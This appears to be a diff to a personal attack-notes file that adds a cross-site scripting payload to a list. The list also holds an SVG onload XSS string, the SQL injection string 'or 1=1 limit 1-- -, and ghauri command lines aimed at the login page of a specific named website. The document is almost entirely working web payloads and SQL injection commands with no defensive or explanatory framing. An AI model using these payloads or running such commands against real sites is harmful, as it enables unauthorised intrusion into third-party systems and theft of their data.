@@ -1,5 +1,6 @@
 "><svg/onload=confirm(1)>"@x
 'or 1=1 limit 1-- -
+<!--><svg onload=alert(1)-->.asp<svg onload=alert(document.domain)>
 
 ghauri -u "https://omnibookslibrary.com/login.php" --data="mobile=*&password=pass&login=" --batch --flush-session
 ghauri -r req.txt --batch --flush-session --level 3
